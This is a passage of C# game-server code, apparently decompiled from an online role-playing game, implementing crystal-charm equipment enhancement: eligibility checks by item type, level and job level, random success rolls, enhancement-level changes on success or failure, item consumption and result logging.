								合成提示(num, 2, 0, 装备栏包裹[hcItimesClass97.位置]);
								合成物品表.Clear();
								break;
							}
							bool flag = false;
							bool flag2 = false;
							switch (num61)
							{
							case 1008001057:
								if (value139.FLD_RESIDE2 == 4 && 装备栏包裹[hcItimesClass97.位置].FLD_强化数量 >= 10)
								{
									flag = true;
								}
								break;
							case 1008000025:
								if ((value139.FLD_RESIDE2 == 4 || value139.FLD_RESIDE2 == 1 || value139.FLD_RESIDE2 == 2 || value139.FLD_RESIDE2 == 6 || value139.FLD_RESIDE2 == 5) && value139.FLD_LEVEL >= 130)
								{
									flag = true;
								}
								break;
							case 1008000023:
								if (value139.FLD_RESIDE2 == 4 && value139.FLD_LEVEL < 130)
								{
									flag = true;
								}
								break;
							case 1008000111:
								if (value139.FLD_RESIDE2 == 4 && 装备栏包裹[hcItimesClass97.位置].FLD_强化数量 == 5)
								{
									flag = true;
									flag2 = true;
								}
								break;
							case 1008000112:
								if (value139.FLD_RESIDE2 == 4 && 装备栏包裹[hcItimesClass97.位置].FLD_强化数量 < 10)
								{
									flag = true;
								}
								break;
							case 1008000113:
								if (value139.FLD_RESIDE2 == 4 && 装备栏包裹[hcItimesClass97.位置].FLD_强化数量 < 10)
								{
									flag = true;
								}
								break;
							case 1008001352:
								if (value139.FLD_RESIDE2 == 4 && 装备栏包裹[hcItimesClass97.位置].FLD_强化数量 < 10)
								{
									flag = true;
									flag2 = true;
								}
								break;
							case 1008002222:
							case 1008002238:
							case 1008002254:
								if (value139.FLD_RESIDE2 == 4 && value139.FLD_JOB_LEVEL == 3 && 装备栏包裹[hcItimesClass97.位置].FLD_强化数量 < 5)
								{
									flag = true;
									flag2 = true;
								}
								break;
							case 1008002223:
							case 1008002239:
							case 1008002255:
								if (value139.FLD_RESIDE2 == 4 && value139.FLD_JOB_LEVEL == 4 && 装备栏包裹[hcItimesClass97.位置].FLD_强化数量 < 5)
								{
									flag = true;
									flag2 = true;
								}
								break;
							case 1008002224:
							case 1008002240:
							case 1008002256:
								if (value139.FLD_RESIDE2 == 4 && value139.FLD_JOB_LEVEL == 5 && 装备栏包裹[hcItimesClass97.位置].FLD_强化数量 < 5)
								{
									flag = true;
									flag2 = true;
								}
								break;
							case 1008002225:
							case 1008002241:
							case 1008002257:
								if (value139.FLD_RESIDE2 == 4 && value139.FLD_JOB_LEVEL == 6 && 装备栏包裹[hcItimesClass97.位置].FLD_强化数量 < 5)
								{
									flag = true;
									flag2 = true;
								}
								break;
							case 1008002226:
							case 1008002242:
							case 1008002258:
								if (value139.FLD_RESIDE2 == 4 && value139.FLD_JOB_LEVEL == 7 && 装备栏包裹[hcItimesClass97.位置].FLD_强化数量 < 5)
								{
									flag = true;
									flag2 = true;
								}
								break;
							case 1008002227:
							case 1008002243:
							case 1008002259:
								if (value139.FLD_RESIDE2 == 4 && value139.FLD_JOB_LEVEL == 8 && 装备栏包裹[hcItimesClass97.位置].FLD_强化数量 < 5)
								{
									flag = true;
									flag2 = true;
								}
								break;
							case 1008002228:
							case 1008002244:
							case 1008002260:
								if (value139.FLD_RESIDE2 == 4 && value139.FLD_JOB_LEVEL == 9 && 装备栏包裹[hcItimesClass97.位置].FLD_强化数量 < 5)
								{
									flag = true;
									flag2 = true;
								}
								break;
							case 1008002229:
							case 1008002245:
							case 1008002261:
								if (value139.FLD_RESIDE2 == 4 && value139.FLD_JOB_LEVEL == 10 && 装备栏包裹[hcItimesClass97.位置].FLD_强化数量 < 5)
								{
									flag = true;
									flag2 = true;
								}
								break;
							case 1008001058:
								if (装备栏包裹[hcItimesClass97.位置].FLD_强化数量 >= 10 && (value139.FLD_RESIDE2 == 1 || value139.FLD_RESIDE2 == 2 || value139.FLD_RESIDE2 == 6 || value139.FLD_RESIDE2 == 5 || value139.FLD_RESIDE2 == 14))
								{
									flag = true;
								}
								break;
							case 1008000024:
								if (value139.FLD_LEVEL < 130 && (value139.FLD_RESIDE2 == 1 || value139.FLD_RESIDE2 == 2 || value139.FLD_RESIDE2 == 6 || value139.FLD_RESIDE2 == 5 || value139.FLD_RESIDE2 == 14))
								{
									flag = true;
								}
								break;
							case 1008000114:
								if (装备栏包裹[hcItimesClass97.位置].FLD_强化数量 == 5 && (value139.FLD_RESIDE2 == 1 || value139.FLD_RESIDE2 == 2 || value139.FLD_RESIDE2 == 6 || value139.FLD_RESIDE2 == 5 || value139.FLD_RESIDE2 == 14))
								{
									flag = true;
									flag2 = true;
								}
								break;
							case 1008000115:
								if (装备栏包裹[hcItimesClass97.位置].FLD_强化数量 < 10 && (value139.FLD_RESIDE2 == 1 || value139.FLD_RESIDE2 == 2 || value139.FLD_RESIDE2 == 6 || value139.FLD_RESIDE2 == 5 || value139.FLD_RESIDE2 == 14))
								{
									flag = true;
								}
								break;
							case 1008000116:
								if (装备栏包裹[hcItimesClass97.位置].FLD_强化数量 < 10 && (value139.FLD_RESIDE2 == 1 || value139.FLD_RESIDE2 == 2 || value139.FLD_RESIDE2 == 6 || value139.FLD_RESIDE2 == 5 || value139.FLD_RESIDE2 == 14))
								{
									flag = true;
								}
								break;
							case 1008001353:
								if (装备栏包裹[hcItimesClass97.位置].FLD_强化数量 < 10 && (value139.FLD_RESIDE2 == 1 || value139.FLD_RESIDE2 == 2 || value139.FLD_RESIDE2 == 6 || value139.FLD_RESIDE2 == 5 || value139.FLD_RESIDE2 == 14))
								{
									flag = true;
									flag2 = true;
								}
								break;
							case 1008002230:
							case 1008002246:
							case 1008002262:
								if (装备栏包裹[hcItimesClass97.位置].FLD_强化数量 < 5 && value139.FLD_JOB_LEVEL == 3 && (value139.FLD_RESIDE2 == 1 || value139.FLD_RESIDE2 == 2 || value139.FLD_RESIDE2 == 6 || value139.FLD_RESIDE2 == 5))
								{
									flag = true;
									flag2 = true;
								}
								break;
							case 1008002231:
							case 1008002247:
							case 1008002263:
								if (装备栏包裹[hcItimesClass97.位置].FLD_强化数量 < 5 && value139.FLD_JOB_LEVEL == 4 && (value139.FLD_RESIDE2 == 1 || value139.FLD_RESIDE2 == 2 || value139.FLD_RESIDE2 == 6 || value139.FLD_RESIDE2 == 5))
								{
									flag = true;
									flag2 = true;
								}
								break;
							case 1008002232:
							case 1008002248:
							case 1008002264:
								if (装备栏包裹[hcItimesClass97.位置].FLD_强化数量 < 5 && value139.FLD_JOB_LEVEL == 5 && (value139.FLD_RESIDE2 == 1 || value139.FLD_RESIDE2 == 2 || value139.FLD_RESIDE2 == 6 || value139.FLD_RESIDE2 == 5))
								{
									flag = true;
									flag2 = true;
								}
								break;
							case 1008002233:
							case 1008002249:
							case 1008002265:
								if (装备栏包裹[hcItimesClass97.位置].FLD_强化数量 < 5 && value139.FLD_JOB_LEVEL == 6 && (value139.FLD_RESIDE2 == 1 || value139.FLD_RESIDE2 == 2 || value139.FLD_RESIDE2 == 6 || value139.FLD_RESIDE2 == 5))
								{
									flag = true;
									flag2 = true;
								}
								break;
							case 1008002234:
							case 1008002250:
							case 1008002266:
								if (装备栏包裹[hcItimesClass97.位置].FLD_强化数量 < 5 && value139.FLD_JOB_LEVEL == 7 && (value139.FLD_RESIDE2 == 1 || value139.FLD_RESIDE2 == 2 || value139.FLD_RESIDE2 == 6 || value139.FLD_RESIDE2 == 5))
								{
									flag = true;
									flag2 = true;
								}
								break;
							case 1008002235:
							case 1008002251:
							case 1008002267:
								if (装备栏包裹[hcItimesClass97.位置].FLD_强化数量 < 5 && value139.FLD_JOB_LEVEL == 8 && (value139.FLD_RESIDE2 == 1 || value139.FLD_RESIDE2 == 2 || value139.FLD_RESIDE2 == 6 || value139.FLD_RESIDE2 == 5))
								{
									flag = true;
									flag2 = true;
								}
								break;
							case 1008002236:
							case 1008002252:
							case 1008002268:
								if (装备栏包裹[hcItimesClass97.位置].FLD_强化数量 < 5 && value139.FLD_JOB_LEVEL == 9 && (value139.FLD_RESIDE2 == 1 || value139.FLD_RESIDE2 == 2 || value139.FLD_RESIDE2 == 6 || value139.FLD_RESIDE2 == 5))
								{
									flag = true;
									flag2 = true;
								}
								break;
							case 1008002237:
							case 1008002253:
							case 1008002269:
								if (装备栏包裹[hcItimesClass97.位置].FLD_强化数量 < 5 && value139.FLD_JOB_LEVEL == 10 && (value139.FLD_RESIDE2 == 1 || value139.FLD_RESIDE2 == 2 || value139.FLD_RESIDE2 == 6 || value139.FLD_RESIDE2 == 5))
								{
									flag = true;
									flag2 = true;
								}
								break;
							}
							if (!flag)
							{
								合成提示(num, 2, 0, 装备栏包裹[hcItimesClass97.位置]);
								return;
							}
							if (装备栏包裹[hcItimesClass97.位置].物品绑定)
							{
								合成提示(num, 2, 0, 装备栏包裹[hcItimesClass97.位置]);
								合成物品表.Clear();
								return;
							}
							if (hcItimesClass97.强化数量 >= 15)
							{
								合成提示(num, 2, 0, 装备栏包裹[hcItimesClass97.位置]);
								合成物品表.Clear();
								return;
							}
							if (hcItimesClass97.属性1.属性数量 + hcItimesClass97.属性2.属性数量 != 0 && hcItimesClass100 == null)
							{
								系统提示("石头放少了最少得放2个。");
								return;
							}
							if (hcItimesClass97.属性1.属性数量 + hcItimesClass97.属性2.属性数量 != 0 && hcItimesClass97.属性3.属性数量 + hcItimesClass97.属性4.属性数量 != 0 && hcItimesClass101 == null)
							{
								系统提示("石头放少了最少得放3个。");
								return;
							}
							if (value139.FLD_LEVEL >= 130)
							{
								if (hcItimesClass99 != null && BitConverter.ToInt32(hcItimesClass99.物品id, 0) != 800000060)
								{
									合成提示(num, 2, 0, 装备栏包裹[hcItimesClass97.位置]);
									合成物品表.Clear();
									return;
								}
								if (hcItimesClass100 != null && BitConverter.ToInt32(hcItimesClass100.物品id, 0) != 800000060)
								{
									合成提示(num, 2, 0, 装备栏包裹[hcItimesClass97.位置]);
									合成物品表.Clear();
									return;
								}
								if (hcItimesClass101 != null && BitConverter.ToInt32(hcItimesClass101.物品id, 0) != 800000060)
								{
									合成提示(num, 2, 0, 装备栏包裹[hcItimesClass97.位置]);
									合成物品表.Clear();
									return;
								}
							}
							else
							{
								if (hcItimesClass99 != null && BitConverter.ToInt32(hcItimesClass99.物品id, 0) != 800000006)
								{
									合成提示(num, 2, 0, 装备栏包裹[hcItimesClass97.位置]);
									合成物品表.Clear();
									return;
								}
								if (hcItimesClass100 != null && BitConverter.ToInt32(hcItimesClass100.物品id, 0) != 800000006)
								{
									合成提示(num, 2, 0, 装备栏包裹[hcItimesClass97.位置]);
									合成物品表.Clear();
									return;
								}
								if (hcItimesClass101 != null && BitConverter.ToInt32(hcItimesClass101.物品id, 0) != 800000006)
								{
									合成提示(num, 2, 0, 装备栏包裹[hcItimesClass97.位置]);
									合成物品表.Clear();
									return;
								}
							}
							if (合成手续费 > 0 && base.Player_Money < 合成手续费)
							{
								合成提示(11, 4, 0, 装备栏包裹[hcItimesClass97.位置]);
								合成物品表.Clear();
								return;
							}
							double num62 = RNG.Next(1, 110);
							if (hcItimesClass102 != null)
							{
								num62 += (double)幸运符加成(BitConverter.ToInt32(hcItimesClass102.物品id, 0));
							}
							if (元宝合成开关 == 1)
							{
								num62 += 5.0;
							}
							if (base.FLD_人物_追加_合成成功率百分比 != 0.0)
							{
								num62 += 100.0 * base.FLD_人物_追加_合成成功率百分比;
							}
							if (base.FLD_装备_追加_合成成功率百分比 > 0.0)
							{
								num62 += 100.0 * base.FLD_装备_追加_合成成功率百分比 / 2.0;
							}
							bool flag3 = false;
							if (flag2)
							{
								flag3 = true;
							}
							else if ((hcItimesClass97.强化数量 == 0 && num62 >= 100.0 - World.水晶符强1) || (hcItimesClass97.强化数量 == 1 && num62 >= 100.0 - World.水晶符强2) || (hcItimesClass97.强化数量 == 2 && num62 >= 100.0 - World.水晶符强3) || (hcItimesClass97.强化数量 == 3 && num62 >= 100.0 - World.水晶符强4) || (hcItimesClass97.强化数量 == 4 && num62 >= 100.0 - World.水晶符强5) || (hcItimesClass97.强化数量 == 5 && num62 >= 100.0 - World.水晶符强6) || (hcItimesClass97.强化数量 == 6 && num62 >= 100.0 - World.水晶符强7) || (hcItimesClass97.强化数量 == 7 && num62 >= 100.0 - World.水晶符强8) || (hcItimesClass97.强化数量 == 8 && num62 >= 100.0 - World.水晶符强9) || (hcItimesClass97.强化数量 == 9 && num62 >= 100.0 - World.水晶符强10) || (hcItimesClass97.强化数量 == 10 && num62 >= 100.0 - World.至尊取玉强11) || (hcItimesClass97.强化数量 == 11 && num62 >= 100.0 - World.至尊取玉强12) || (hcItimesClass97.强化数量 == 12 && num62 >= 100.0 - World.至尊取玉强13) || (hcItimesClass97.强化数量 == 13 && num62 >= 100.0 - World.至尊取玉强14) || ((hcItimesClass97.强化数量 == 14 && !(num62 < 100.0 - World.至尊取玉强15)) ? true : false))
							{
								flag3 = true;
							}
							if (flag3)
							{
								hcItimesClass97.强化类型 = ((value139.FLD_RESIDE2 == 4) ? 1 : 2);
								switch (BitConverter.ToInt32(装备栏包裹[BitConverter.ToInt32(array5, 0)].物品ID, 0))
								{
								case 1008000023:
									hcItimesClass97.强化数量++;
									break;
								case 1008000024:
									hcItimesClass97.强化数量++;
									break;
								case 1008000025:
									hcItimesClass97.强化数量++;
									break;
								case 1008000111:
									hcItimesClass97.强化数量++;
									break;
								case 1008000112:
									hcItimesClass97.强化数量++;
									if (hcItimesClass97.强化数量 > 10)
									{
										hcItimesClass97.强化数量 = 10;
									}
									break;
								case 1008000113:
								{
									Random random4 = new Random(DateTime.Now.Millisecond);
									hcItimesClass97.强化数量 += random4.Next(1, 3);
									if (hcItimesClass97.强化数量 > 10)
									{
										hcItimesClass97.强化数量 = 10;
									}
									break;
								}
								case 1008000114:
									hcItimesClass97.强化数量++;
									break;
								case 1008000115:
									hcItimesClass97.强化数量++;
									if (hcItimesClass97.强化数量 > 10)
									{
										hcItimesClass97.强化数量 = 10;
									}
									break;
								case 1008000116:
								{
									Random random3 = new Random(DateTime.Now.Millisecond);
									hcItimesClass97.强化数量 += random3.Next(1, 3);
									if (hcItimesClass97.强化数量 > 10)
									{
										hcItimesClass97.强化数量 = 10;
									}
									break;
								}
								case 1008001057:
									hcItimesClass97.强化数量++;
									break;
								case 1008001058:
									hcItimesClass97.强化数量++;
									break;
								case 1008001352:
									hcItimesClass97.强化数量++;
									break;
								case 1008001353:
									hcItimesClass97.强化数量++;
									break;
								case 1008002222:
								case 1008002223:
								case 1008002224:
								case 1008002225:
								case 1008002226:
								case 1008002227:
								case 1008002228:
								case 1008002229:
								case 1008002230:
								case 1008002231:
								case 1008002232:
								case 1008002233:
								case 1008002234:
								case 1008002235:
								case 1008002236:
								case 1008002237:
									if (hcItimesClass97.强化数量 < 7)
									{
										hcItimesClass97.强化数量 = 7;
									}
									break;
								case 1008002238:
								case 1008002239:
								case 1008002240:
								case 1008002241:
								case 1008002242:
								case 1008002243:
								case 1008002244:
								case 1008002245:
								case 1008002246:
								case 1008002247:
								case 1008002248:
								case 1008002249:
								case 1008002250:
								case 1008002251:
								case 1008002252:
								case 1008002253:
								{
									Random random2 = new Random(DateTime.Now.Millisecond);
									if (hcItimesClass97.强化数量 < 7)
									{
										hcItimesClass97.强化数量 = random2.Next(7, 8);
									}
									break;
								}
								case 1008002254:
								case 1008002255:
								case 1008002256:
								case 1008002257:
								case 1008002258:
								case 1008002259:
								case 1008002260:
								case 1008002261:
								case 1008002262:
								case 1008002263:
								case 1008002264:
								case 1008002265:
								case 1008002266:
								case 1008002267:
								case 1008002268:
								case 1008002269:
									if (hcItimesClass97.强化数量 < 10)
									{
										hcItimesClass97.强化数量 = 10;
									}
									break;
								}
								if (hcItimesClass97.强化数量 > 15)
								{
									hcItimesClass97.强化数量 = 15;
								}
								hcItimesClass97.设置阶段属性();
								减去物品(BitConverter.ToInt32(array5, 0), 1);
								if (hcItimesClass97.强化数量 >= int.Parse(World.强化数量大于发送快报[1]))
								{
									发送快报(base.UserName, hcItimesClass97.强化数量, hcItimesClass97.物品id, base.Player_Zx);
								}
								if (BitConverter.ToInt32(装备栏包裹[hcItimesClass97.位置].物品ID, 0) != 0 && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass97.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass97.物品全局ID, 0)) ? true : false))
								{
									减去物品(hcItimesClass97.位置, 1);
									增加物品(hcItimesClass97.物品全局ID, hcItimesClass97.物品id, hcItimesClass97.位置, hcItimesClass97.物品数量, hcItimesClass97.物品属性);
								}
								装备栏包裹[hcItimesClass97.位置].锁定 = false;
								RxjhClass.合成记录(base.Userid, base.UserName, value139.ItmeNAME, num, 装备栏包裹[BitConverter.ToInt32(array5, 0)].得到物品名称(), "成功", 装备栏包裹[hcItimesClass97.位置]);
								合成提示(num, 1, 合成手续费, 装备栏包裹[hcItimesClass97.位置]);
							}
							else
							{
								RxjhClass.合成记录(base.Userid, base.UserName, value139.ItmeNAME, num, 装备栏包裹[BitConverter.ToInt32(array5, 0)].得到物品名称(), "失败", 装备栏包裹[hcItimesClass97.位置]);
								switch (BitConverter.ToInt32(装备栏包裹[BitConverter.ToInt32(array5, 0)].物品ID, 0))
								{
								case 1008000023:
									hcItimesClass97.强化类型 = 0;
									hcItimesClass97.强化数量 = 0;
									hcItimesClass97.设置阶段属性();
									if (BitConverter.ToInt32(装备栏包裹[hcItimesClass97.位置].物品ID, 0) != 0 && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass97.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass97.物品全局ID, 0)) ? true : false))
									{
										减去物品(hcItimesClass97.位置, 1);
										增加物品(hcItimesClass97.物品全局ID, hcItimesClass97.物品id, hcItimesClass97.位置, hcItimesClass97.物品数量, hcItimesClass97.物品属性);
									}
									break;
								case 1008000024:
									hcItimesClass97.强化类型 = 0;
									hcItimesClass97.强化数量 = 0;
									hcItimesClass97.设置阶段属性();
									if (BitConverter.ToInt32(装备栏包裹[hcItimesClass97.位置].物品ID, 0) != 0 && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass97.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass97.物品全局ID, 0)) ? true : false))
									{
										减去物品(hcItimesClass97.位置, 1);
										增加物品(hcItimesClass97.物品全局ID, hcItimesClass97.物品id, hcItimesClass97.位置, hcItimesClass97.物品数量, hcItimesClass97.物品属性);
									}
									break;
								case 1008000025:
									hcItimesClass97.强化类型 = 0;
									hcItimesClass97.强化数量 = 0;
									hcItimesClass97.设置阶段属性();
									if (BitConverter.ToInt32(装备栏包裹[hcItimesClass97.位置].物品ID, 0) != 0 && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass97.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass97.物品全局ID, 0)) ? true : false))
									{
										减去物品(hcItimesClass97.位置, 1);
										增加物品(hcItimesClass97.物品全局ID, hcItimesClass97.物品id, hcItimesClass97.位置, hcItimesClass97.物品数量, new byte[56]);
									}
									break;
								case 1008000112:
									hcItimesClass97.强化数量--;
									if (hcItimesClass97.强化数量 <= 0)
									{
										hcItimesClass97.强化数量 = 0;
										hcItimesClass97.强化类型 = 0;
									}
									hcItimesClass97.设置阶段属性();
									if (BitConverter.ToInt32(装备栏包裹[hcItimesClass97.位置].物品ID, 0) != 0 && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass97.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass97.物品全局ID, 0)) ? true : false))
									{
										减去物品(hcItimesClass97.位置, 1);
										增加物品(hcItimesClass97.物品全局ID, hcItimesClass97.物品id, hcItimesClass97.位置, hcItimesClass97.物品数量, hcItimesClass97.物品属性);
									}
									break;
								case 1008000113:
									hcItimesClass97.强化类型 = 0;
									hcItimesClass97.强化数量 = 0;
									hcItimesClass97.设置阶段属性();
									if (BitConverter.ToInt32(装备栏包裹[hcItimesClass97.位置].物品ID, 0) != 0 && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass97.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass97.物品全局ID, 0)) ? true : false))
									{
										减去物品(hcItimesClass97.位置, 1);
										增加物品(hcItimesClass97.物品全局ID, hcItimesClass97.物品id, hcItimesClass97.位置, hcItimesClass97.物品数量, hcItimesClass97.物品属性);
									}
									break;
								case 1008000115:
									hcItimesClass97.强化数量--;
									if (hcItimesClass97.强化数量 <= 0)
									{
										hcItimesClass97.强化数量 = 0;
										hcItimesClass97.强化类型 = 0;
									}
									hcItimesClass97.设置阶段属性();
									if (BitConverter.ToInt32(装备栏包裹[hcItimesClass97.位置].物品ID, 0) != 0 && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass97.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass97.物品全局ID, 0)) ? true : false))
									{
										减去物品(hcItimesClass97.位置, 1);
										增加物品(hcItimesClass97.物品全局ID, hcItimesClass97.物品id, hcItimesClass97.位置, hcItimesClass97.物品数量, hcItimesClass97.物品属性);
									}
									break;
								case 1008000116:
									hcItimesClass97.强化类型 = 0;
									hcItimesClass97.强化数量 = 0;
									hcItimesClass97.设置阶段属性();
									if (BitConverter.ToInt32(装备栏包裹[hcItimesClass97.位置].物品ID, 0) != 0 && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass97.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass97.物品全局ID, 0)) ? true : false))
									{
										减去物品(hcItimesClass97.位置, 1);
										增加物品(hcItimesClass97.物品全局ID, hcItimesClass97.物品id, hcItimesClass97.位置, hcItimesClass97.物品数量, hcItimesClass97.物品属性);
									}
									break;
								case 1008001057:
									hcItimesClass97.强化数量--;
									if (hcItimesClass97.强化数量 <= 0)
									{
										hcItimesClass97.强化数量 = 0;
										hcItimesClass97.强化类型 = 0;
									}
									if (hcItimesClass97.强化数量 == 9)
									{
										hcItimesClass97.强化数量 = 10;
									}
									hcItimesClass97.设置阶段属性();
									if (BitConverter.ToInt32(装备栏包裹[hcItimesClass97.位置].物品ID, 0) != 0 && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass97.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass97.物品全局ID, 0)) ? true : false))
									{
										减去物品(hcItimesClass97.位置, 1);
										增加物品(hcItimesClass97.物品全局ID, hcItimesClass97.物品id, hcItimesClass97.位置, hcItimesClass97.物品数量, hcItimesClass97.物品属性);
									}
									break;
								case 1008001058:
									hcItimesClass97.强化数量--;
									if (hcItimesClass97.强化数量 <= 0)
									{
										hcItimesClass97.强化数量 = 0;
										hcItimesClass97.强化类型 = 0;
									}
									if (hcItimesClass97.强化数量 == 9)
									{
										hcItimesClass97.强化数量 = 10;
									}
									hcItimesClass97.设置阶段属性();
									if (BitConverter.ToInt32(装备栏包裹[hcItimesClass97.位置].物品ID, 0) != 0 && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass97.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass97.物品全局ID, 0)) ? true : false))
									{
										减去物品(hcItimesClass97.位置, 1);
										增加物品(hcItimesClass97.物品全局ID, hcItimesClass97.物品id, hcItimesClass97.位置, hcItimesClass97.物品数量, hcItimesClass97.物品属性);
									}
									break;
								}
								合成提示(num, 0, 合成手续费, 装备栏包裹[hcItimesClass97.位置]);
								减去物品(BitConverter.ToInt32(array5, 0), 1);
							}
							减去物品(hcItimesClass99.位置, 1);
							if (hcItimesClass100 != null)
							{
								减去物品(hcItimesClass100.位置, 1);
							}
							if (hcItimesClass101 != null)
							{
								减去物品(hcItimesClass101.位置, 1);
							}
							if (hcItimesClass102 != null)
							{
								减去物品(hcItimesClass102.位置, 1);
							}
							合成物品表.Clear();
							合成系统解锁();
							元宝合成开关 = 0;
							合成手续费 = 0;
							打开仓库中 = false;
							base.Player_Money -= 合成手续费;
							更新金钱和负重();
							break;
						}
					}
					catch (Exception ex58)
					{
						元宝合成开关 = 0;
						base.Client.Dispose();
						MainForm.WriteLine(9, "合成水晶符确认出错![" + base.Userid + "]-[" + base.UserName + "]" + ex58.Message);
					}
					break;
				case 41:
					try
					{
						if (base.当前操作类型 != 101 || 合成物品表.ContainsKey(1))
						{
							break;
						}
						if (装备栏包裹[num30].物品绑定)
						{
							合成提示(num, 2, 0, 装备栏包裹[num30]);
							break;
						}
						byte[] array27 = new byte[4];
						Buffer.BlockCopy(封包数据, 14, array27, 0, 4);
						if (!World.Itme.TryGetValue((int)装备栏包裹[num30].Get物品ID, out var value66) || 装备栏包裹[num30].FLD_强化数量 >= 15)
						{
							break;
						}
						if (value66.FLD_RESIDE2 != 1 && value66.FLD_RESIDE2 != 2 && value66.FLD_RESIDE2 != 4 && value66.FLD_RESIDE2 != 5 && value66.FLD_RESIDE2 != 6 && value66.FLD_RESIDE2 != 14)
						{
							合成提示(num, 5, 0, 装备栏包裹[num30]);
							break;
						}
						int num4 = (int)装备栏包裹[BitConverter.ToInt32(array27, 0)].Get物品ID;
						bool flag6 = false;
						switch (num4)
						{
						case 1008001057:
							if (value66.FLD_RESIDE2 == 4 && 装备栏包裹[num30].FLD_强化数量 >= 10)
							{
								flag6 = true;
							}
							break;
						case 1008000025:
							if ((value66.FLD_RESIDE2 == 4 || value66.FLD_RESIDE2 == 1 || value66.FLD_RESIDE2 == 2 || value66.FLD_RESIDE2 == 6 || value66.FLD_RESIDE2 == 5) && value66.FLD_LEVEL >= 130)
							{
								flag6 = true;
							}
							break;
						case 1008000023:
							if (value66.FLD_RESIDE2 == 4 && value66.FLD_LEVEL < 130)
							{
								flag6 = true;
							}
							break;
						case 1008000111:
							if (value66.FLD_RESIDE2 == 4 && 装备栏包裹[num30].FLD_强化数量 == 5)
							{
								flag6 = true;
							}
							break;
						case 1008000112:
							if (value66.FLD_RESIDE2 == 4 && 装备栏包裹[num30].FLD_强化数量 < 10)
							{
								flag6 = true;
							}
							break;
						case 1008000113:
							if (value66.FLD_RESIDE2 == 4 && 装备栏包裹[num30].FLD_强化数量 < 10)
							{
								flag6 = true;
							}
							break;
						case 1008001352:
							if (value66.FLD_RESIDE2 == 4 && 装备栏包裹[num30].FLD_强化数量 < 10)
							{
								flag6 = true;
							}
							break;
						case 1008002222:
						case 1008002238:
						case 1008002254:
							if (value66.FLD_RESIDE2 == 4 && value66.FLD_JOB_LEVEL == 3 && 装备栏包裹[num30].FLD_强化数量 < 5)
							{
								flag6 = true;
							}
							break;
						case 1008002223:
						case 1008002239:
						case 1008002255:
							if (value66.FLD_RESIDE2 == 4 && value66.FLD_JOB_LEVEL == 4 && 装备栏包裹[num30].FLD_强化数量 < 5)
							{
								flag6 = true;
							}
							break;
						case 1008002224:
						case 1008002240:
						case 1008002256:
							if (value66.FLD_RESIDE2 == 4 && value66.FLD_JOB_LEVEL == 5 && 装备栏包裹[num30].FLD_强化数量 < 5)
							{
								flag6 = true;
							}
							break;
						case 1008002225:
						case 1008002241:
						case 1008002257:
							if (value66.FLD_RESIDE2 == 4 && value66.FLD_JOB_LEVEL == 6 && 装备栏包裹[num30].FLD_强化数量 < 5)
							{
								flag6 = true;
							}
							break;
						case 1008002226:
						case 1008002242:
						case 1008002258:
							if (value66.FLD_RESIDE2 == 4 && value66.FLD_JOB_LEVEL == 7 && 装备栏包裹[num30].FLD_强化数量 < 5)
							{
								flag6 = true;
							}
							break;
						case 1008002227:
						case 1008002243:
						case 1008002259:
							if (value66.FLD_RESIDE2 == 4 && value66.FLD_JOB_LEVEL == 8 && 装备栏包裹[num30].FLD_强化数量 < 5)
							{
								flag6 = true;
							}
							break;
						case 1008002228:
						case 1008002244:
						case 1008002260:
							if (value66.FLD_RESIDE2 == 4 && value66.FLD_JOB_LEVEL == 9 && 装备栏包裹[num30].FLD_强化数量 < 5)
							{
								flag6 = true;
							}
							break;
						case 1008002229:
						case 1008002245:
						case 1008002261:
							if (value66.FLD_RESIDE2 == 4 && value66.FLD_JOB_LEVEL == 10 && 装备栏包裹[num30].FLD_强化数量 < 5)
							{
								flag6 = true;
							}
							break;
						case 1008001058:
							if (装备栏包裹[num30].FLD_强化数量 >= 10 && (value66.FLD_RESIDE2 == 1 || value66.FLD_RESIDE2 == 2 || value66.FLD_RESIDE2 == 6 || value66.FLD_RESIDE2 == 5 || value66.FLD_RESIDE2 == 14))
							{
								flag6 = true;
							}
							break;
						case 1008000024:
							if (value66.FLD_LEVEL < 130 && (value66.FLD_RESIDE2 == 1 || value66.FLD_RESIDE2 == 2 || value66.FLD_RESIDE2 == 6 || value66.FLD_RESIDE2 == 5 || value66.FLD_RESIDE2 == 14))
							{
								flag6 = true;
							}
							break;
						case 1008000114:
							if (装备栏包裹[num30].FLD_强化数量 == 5 && (value66.FLD_RESIDE2 == 1 || value66.FLD_RESIDE2 == 2 || value66.FLD_RESIDE2 == 6 || value66.FLD_RESIDE2 == 5 || value66.FLD_RESIDE2 == 14))
							{
								flag6 = true;
							}
							break;
						case 1008000115:
							if (装备栏包裹[num30].FLD_强化数量 < 10 && (value66.FLD_RESIDE2 == 1 || value66.FLD_RESIDE2 == 2 || value66.FLD_RESIDE2 == 6 || value66.FLD_RESIDE2 == 5 || value66.FLD_RESIDE2 == 14))
							{
								flag6 = true;
							}
							break;
						case 1008000116:
							if (装备栏包裹[num30].FLD_强化数量 < 10 && (value66.FLD_RESIDE2 == 1 || value66.FLD_RESIDE2 == 2 || value66.FLD_RESIDE2 == 6 || value66.FLD_RESIDE2 == 5 || value66.FLD_RESIDE2 == 14))
							{
								flag6 = true;
							}
							break;
						case 1008001353:
							if (装备栏包裹[num30].FLD_强化数量 < 10 && (value66.FLD_RESIDE2 == 1 || value66.FLD_RESIDE2 == 2 || value66.FLD_RESIDE2 == 6 || value66.FLD_RESIDE2 == 5 || value66.FLD_RESIDE2 == 14))
							{
								flag6 = true;
							}
							break;
						case 1008002230:
						case 1008002246:
						case 1008002262:
